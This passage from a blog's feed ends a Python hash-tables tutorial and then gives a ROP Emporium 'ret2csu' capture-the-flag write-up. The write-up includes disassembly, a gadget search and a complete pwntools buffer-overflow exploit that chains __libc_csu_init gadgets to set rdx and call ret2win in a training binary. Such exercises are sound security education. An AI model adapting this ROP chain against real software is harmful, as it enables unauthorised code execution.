&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; car_tuple &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Car(name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Toyota&amp;#34;&lt;/span&gt;, color&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;black&amp;#34;&lt;/span&gt;, size&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;big&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; car_dict &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Toyota&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;color&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;black&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;big&amp;#34;&lt;/span&gt;}
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getsizeof(car_tuple)
&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getsizeof(car_dict)
&lt;span style=&#34;color:#ae81ff&#34;&gt;232&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Order:&lt;/strong&gt; Both are ordered (since Python 3.6).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Hashing:&lt;/strong&gt; &lt;code&gt;namedtuple&lt;/code&gt; instances only allow strings to be their attribute names, as opposed to dictionaries that allow everything as long as it is hashable.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;toast toast--blue add-margin&#34;&gt;
	&lt;div class=&#34;toast__content&#34;&gt;
		&lt;p class=&#34;toast__type&#34;&gt;Note&lt;/p&gt;
		&lt;p class=&#34;toast__message&#34;&gt;
			Python 3.7 added &lt;a href=&#34;https://docs.python.org/3/library/dataclasses.html&#34;&gt;data classes&lt;/a&gt; that you may find easier to use than &lt;code&gt;namedtuple&lt;/code&gt;, though this article won&amp;rsquo;t cover them.
		&lt;/p&gt;
	&lt;/div&gt;
&lt;/div&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Congratulations! You&amp;rsquo;ve now had a comprehensive overview on Python hash tables. You&amp;rsquo;ve learned an important concept in computer science - hash tables, how they are implemented in Python, the awesome optimizations of Python dictionaries, and when to use Python hash tables. You now know that hash tables trade space for time, and you can even practice comparing size and speed of different data structures yourself. I hope that you feel more confident choosing data structures for your next project!&lt;/p&gt;
&lt;p&gt;You can get all of the code you saw in this tutorial by clicking &lt;a href=&#34;https://github.com/AdamGold/materials/tree/patch-1/python-hash-tables&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;further-reading&#34;&gt;Further Reading&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Raymond Hettinger on the key ideas of Python dictionaries and how they evolved over time: &lt;a href=&#34;https://www.youtube.com/watch?v=npw4s1QTmPg&#34;&gt;https://www.youtube.com/watch?v=npw4s1QTmPg&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Brandon Rhodes on the features and implementation of Python dictionaries: &lt;a href=&#34;https://www.youtube.com/watch?v=66P5FMkWoVU&#34;&gt;https://www.youtube.com/watch?v=66P5FMkWoVU&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Brandon Rhodes on Python hash tables: &lt;a href=&#34;https://www.youtube.com/watch?v=C4Kc8xzcA68&#34;&gt;https://www.youtube.com/watch?v=C4Kc8xzcA68&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Laurent Luce post describing how dictionaries are implemented in the Python language: &lt;a href=&#34;https://www.laurentluce.com/posts/python-dictionary-implementation/&#34;&gt;https://www.laurentluce.com/posts/python-dictionary-implementation/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;

        
        </description>
    </item>
    
    <item>
      <title>ROP Emporium Ret2CSU Writeup</title>
      <link>https://adamgold.github.io/posts/ropemporium-ret2csu/</link>
      <pubDate>Sat, 04 Jan 2020 21:28:48 +0300</pubDate>
      
      <guid>https://adamgold.github.io/posts/ropemporium-ret2csu/</guid>
      <description>
        
          
          
          
        
        
        &lt;p&gt;Last ROP Emporium callenge - &lt;a href=&#34;https://ropemporium.com/challenge/ret2csu.html&#34;&gt;Ret2CSU&lt;/a&gt;! This challenge requires a usage of something called Universal Gadget, that will allow us to use three parameters to functions calls, when we do not have any useful gadgets available to us.&lt;/p&gt;
&lt;p&gt;Our goal is to call the &lt;code&gt;ret2win&lt;/code&gt; function with &lt;code&gt;rdx&lt;/code&gt; filled with &lt;code&gt;0xdeadcafebabebeef&lt;/code&gt;. As mentioned before, the main challenge here is having no gadgets allowing us to directly control &lt;code&gt;rdx&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pwndbg&amp;gt; checksec
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/adamgold/Desktop/ctfs/ret2csu/ret2csu&amp;#39;&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x400000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

pwndbg&amp;gt; disass main
Dump of assembler code &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; main:
   0x00000000004006d7 &amp;lt;+0&amp;gt;:	push   rbp
   0x00000000004006d8 &amp;lt;+1&amp;gt;:	mov    rbp,rsp
   0x00000000004006db &amp;lt;+4&amp;gt;:	mov    rax,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rip+0x20097e&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# 0x601060 &amp;lt;stdout@@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
   0x00000000004006e2 &amp;lt;+11&amp;gt;:	mov    ecx,0x0
   0x00000000004006e7 &amp;lt;+16&amp;gt;:	mov    edx,0x2
   0x00000000004006ec &amp;lt;+21&amp;gt;:	mov    esi,0x0
   0x00000000004006f1 &amp;lt;+26&amp;gt;:	mov    rdi,rax
   0x00000000004006f4 &amp;lt;+29&amp;gt;:	call   0x4005e0 &amp;lt;setvbuf@plt&amp;gt;
   0x00000000004006f9 &amp;lt;+34&amp;gt;:	mov    edi,0x4008c8
   0x00000000004006fe &amp;lt;+39&amp;gt;:	call   0x400590 &amp;lt;puts@plt&amp;gt;
   0x0000000000400703 &amp;lt;+44&amp;gt;:	mov    eax,0x0
   0x0000000000400708 &amp;lt;+49&amp;gt;:	call   0x400714 &amp;lt;pwnme&amp;gt;
   0x000000000040070d &amp;lt;+54&amp;gt;:	mov    eax,0x0
   0x0000000000400712 &amp;lt;+59&amp;gt;:	pop    rbp
   0x0000000000400713 &amp;lt;+60&amp;gt;:	ret
End of assembler dump.
pwndbg&amp;gt; disass pwnme
Dump of assembler code &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; pwnme:
   0x0000000000400714 &amp;lt;+0&amp;gt;:	push   rbp
   0x0000000000400715 &amp;lt;+1&amp;gt;:	mov    rbp,rsp
   0x0000000000400718 &amp;lt;+4&amp;gt;:	sub    rsp,0x20
   0x000000000040071c &amp;lt;+8&amp;gt;:	lea    rax,&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x20&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x0000000000400720 &amp;lt;+12&amp;gt;:	mov    edx,0x20
   0x0000000000400725 &amp;lt;+17&amp;gt;:	mov    esi,0x0
   0x000000000040072a &amp;lt;+22&amp;gt;:	mov    rdi,rax
   0x000000000040072d &amp;lt;+25&amp;gt;:	call   0x4005c0 &amp;lt;memset@plt&amp;gt;
   0x0000000000400732 &amp;lt;+30&amp;gt;:	mov    edi,0x4008e1
   0x0000000000400737 &amp;lt;+35&amp;gt;:	call   0x400590 &amp;lt;puts@plt&amp;gt;
   0x000000000040073c &amp;lt;+40&amp;gt;:	mov    edi,0x4008f0
   0x0000000000400741 &amp;lt;+45&amp;gt;:	call   0x400590 &amp;lt;puts@plt&amp;gt;
   0x0000000000400746 &amp;lt;+50&amp;gt;:	mov    edi,0x400924
   0x000000000040074b &amp;lt;+55&amp;gt;:	call   0x400590 &amp;lt;puts@plt&amp;gt;
   0x0000000000400750 &amp;lt;+60&amp;gt;:	mov    edi,0x400925
   0x0000000000400755 &amp;lt;+65&amp;gt;:	mov    eax,0x0
   0x000000000040075a &amp;lt;+70&amp;gt;:	call   0x4005b0 &amp;lt;printf@plt&amp;gt;
   0x000000000040075f &amp;lt;+75&amp;gt;:	mov    eax,0x601018
   0x0000000000400764 &amp;lt;+80&amp;gt;:	mov    QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,0x0
   0x000000000040076b &amp;lt;+87&amp;gt;:	mov    eax,0x601028
   0x0000000000400770 &amp;lt;+92&amp;gt;:	mov    QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,0x0
   0x0000000000400777 &amp;lt;+99&amp;gt;:	mov    eax,0x601030
   0x000000000040077c &amp;lt;+104&amp;gt;:	mov    QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,0x0
   0x0000000000400783 &amp;lt;+111&amp;gt;:	mov    rdx,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rip+0x2008e6&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# 0x601070 &amp;lt;stdin@@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
   0x000000000040078a &amp;lt;+118&amp;gt;:	lea    rax,&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x20&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x000000000040078e &amp;lt;+122&amp;gt;:	mov    esi,0xb0
   0x0000000000400793 &amp;lt;+127&amp;gt;:	mov    rdi,rax
   0x0000000000400796 &amp;lt;+130&amp;gt;:	call   0x4005d0 &amp;lt;fgets@plt&amp;gt;
   0x000000000040079b &amp;lt;+135&amp;gt;:	mov    eax,0x601038
   0x00000000004007a0 &amp;lt;+140&amp;gt;:	mov    QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,0x0
   0x00000000004007a7 &amp;lt;+147&amp;gt;:	mov    rdi,0x0
   0x00000000004007ae &amp;lt;+154&amp;gt;:	nop
   0x00000000004007af &amp;lt;+155&amp;gt;:	leave
   0x00000000004007b0 &amp;lt;+156&amp;gt;:	ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Looking at the disassembly, this challenge is pretty much the same as earlier challenges. We need to overflow the buffer in &lt;code&gt;pwnme&lt;/code&gt;, return to &lt;code&gt;ret2win&lt;/code&gt; BUT change &lt;code&gt;rdx&lt;/code&gt; first. Let&amp;rsquo;s hunt for gadgets:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adamgold@adamgold-VirtualBox:~/Desktop/ctfs/ret2csu$ ropper --file ret2csu --search &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pop rdx&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Load gadgets from cache
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;LOAD&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; loading... 100%
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;LOAD&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; removing double gadgets... 100%
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Searching &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; gadgets: pop rdx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I tried searching for more rdx-related gadgets but could not find any. After struggling with this for some time, I discovered something I was unfamiliar with - &lt;a href=&#34;https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html&#34;&gt;Universal gadgets&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;__libc_csu_init functions provides a few nice gadgets to load data into certain critical registers. Most importantly EDI, RSI and RDX.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;That&amp;rsquo;s perfect! Let&amp;rsquo;s get these gadgets from the disassembly of the file:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;objdump -d ./ret2csu -M intel

&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000400840&lt;/span&gt; :

400880:Â Â Â Â 4c &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; faÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â movÂ Â Â Â rdx,r15

Â Â 400883:Â Â Â Â 4c &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; f6Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â movÂ Â Â Â rsi,r14

Â Â 400886:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; efÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â movÂ Â Â Â edi,r13d

Â Â 400889:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; ff &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; dcÂ Â Â Â Â Â Â Â Â Â Â Â Â Â callÂ Â Â QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;r12+rbx*8&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;

Â Â 40088d:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; c3 01Â Â Â Â Â Â Â Â Â Â Â Â Â Â addÂ Â Â Â rbx,0x1

Â Â 400891:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; ddÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â cmpÂ Â Â Â rbp,rbx

Â Â 400894:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt; eaÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â jneÂ Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;400880&lt;/span&gt;

Â Â 400896:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; c4 08Â Â Â Â Â Â Â Â Â Â Â Â Â Â addÂ Â Â Â rsp,0x8

  .........


Â Â 40089a:Â Â Â Â 5bÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â popÂ Â Â Â rbx

Â Â 40089b:Â Â Â Â 5dÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â popÂ Â Â Â rbp

Â Â 40089c:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; 5cÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â popÂ Â Â Â r12

Â Â 40089e:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; 5dÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â popÂ Â Â Â r13

Â Â 4008a0:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; 5eÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â popÂ Â Â Â r14

Â Â 4008a2:Â Â Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; 5fÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â popÂ Â Â Â r15

Â Â 4008a4:Â Â Â Â c3Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This allows us to move r15 into &lt;code&gt;rdx&lt;/code&gt; - But, then there&amp;rsquo;s a call to &lt;code&gt;[r12+rbx*8]&lt;/code&gt; and a &lt;code&gt;cmp&lt;/code&gt; instruction right after. We&amp;rsquo;re going to need to use the second section of gadgets shown above to control &lt;code&gt;r12&lt;/code&gt; and &lt;code&gt;rbx&lt;/code&gt;, so these instructions won&amp;rsquo;t get in our way.&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s another useful quote from the article linked to above:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;To effectively use mov rdx,r13 , we have to ensure that &lt;code&gt;call QWORD PTR [r12+rbx*8]&lt;/code&gt; doesn&amp;rsquo;t SIGSEGV, &lt;code&gt;cmp rbx,rbp&lt;/code&gt; equals and most importantly value of &lt;code&gt;RDX&lt;/code&gt; is not altered.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Also noted in the article is that it&amp;rsquo;s possible to use pointers for the &lt;code&gt;_init&lt;/code&gt; function, located at &lt;code&gt;&amp;amp;_DYNAMIC&lt;/code&gt;. That&amp;rsquo;s just what we need for &lt;code&gt;r12&lt;/code&gt;, as we&amp;rsquo;ll zero &lt;code&gt;rbx&lt;/code&gt; - &lt;code&gt;call [_init+0*8]&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; x/10gx &amp;amp;_DYNAMIC

0x600e20:Â Â Â Â 0x0000000000000001Â Â Â Â 0x0000000000000001

0x600e30:Â Â Â Â 0x000000000000000cÂ Â Â Â 0x0000000000400560

0x600e40:Â Â Â Â 0x000000000000000dÂ Â Â Â 0x00000000004008b4

0x600e50:Â Â Â Â 0x0000000000000019Â Â Â Â 0x0000000000600e10

0x600e60:Â Â Â Â 0x000000000000001bÂ Â Â Â 0x0000000000000008

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;0x600e48&lt;/code&gt; contains an address toÂ &lt;code&gt;0x00000000004008b4&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; x/4i 0x00000000004008b4

Â Â Â 0x4008b4 :Â Â Â Â subÂ Â Â Â rsp,0x8

Â Â Â 0x4008b8 :Â Â Â Â addÂ Â Â Â rsp,0x8

Â Â Â 0x4008bc :Â Â Â Â ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Remember that after the call instruction, the program will again pop all registers until reaching the ret instruction. Also, we have &lt;code&gt;add rsp, 0x8&lt;/code&gt; meaning we need another dummy in the stack. Also, &lt;code&gt;rbp&lt;/code&gt; and &lt;code&gt;rbx&lt;/code&gt; must not be equal (because of the &lt;code&gt;cmp&lt;/code&gt; instruction)!&lt;/p&gt;
&lt;h3 id=&#34;summing-up&#34;&gt;Summing Up&lt;/h3&gt;
&lt;p&gt;Here&amp;rsquo;s the plan:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Call first gadget at &lt;code&gt;0x0040089a&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Pop all desired values.&lt;/li&gt;
&lt;li&gt;Register R12 = pointer to &lt;code&gt;__init&lt;/code&gt; address.&lt;/li&gt;
&lt;li&gt;Register R15 = &lt;code&gt;0xdeadcafebabebeef&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Register &lt;code&gt;RBX = 0x0&lt;/code&gt; while &lt;code&gt;RBP = 0x01&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Use second gadget at address 0x400880 that will put the values at correct registers.&lt;/li&gt;
&lt;li&gt;Place the address of ret2win function in the stack.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

ret2win &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00000000004007b1&lt;/span&gt;
rdx_val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xdeadcafebabebeef&lt;/span&gt;
pop_rbx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x000000000040089a&lt;/span&gt;
mov_rdx_r15 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000400880&lt;/span&gt;
dynamic &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x600e48&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exploit&lt;/span&gt;():
    p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./ret2csu&amp;#34;&lt;/span&gt;)
    pause()

    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvrepeat(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.2&lt;/span&gt;)

    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sending buffer overflow&amp;#34;&lt;/span&gt;)

    rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(pop_rbx) &lt;span style=&#34;color:#75715e&#34;&gt;# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# rbp=0x0&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# so rbp won&amp;#39;t equal rbx (cmp rbp, rbx must be false)&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(dynamic) &lt;span style=&#34;color:#75715e&#34;&gt;# r12&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# r13&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# r14&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(rdx_val) &lt;span style=&#34;color:#75715e&#34;&gt;# r15 - our desired rbp value!&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(mov_rdx_r15)  &lt;span style=&#34;color:#75715e&#34;&gt;# popping everything again - mov rdx, r15; mov rsi, r14; mov rdi, r13d; call [r12+rbx*8]; add rbx, 0x1; cmp rbp, rbx; jne 400880; add rsp, 0x8;&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# because of add rsp,0x8 padding - this is a dummy&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# rbx&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# rbp&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# r12&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# r13&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# r14&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# r15&lt;/span&gt;
    rop &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(ret2win)

    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; rop)

    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;success(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvall())


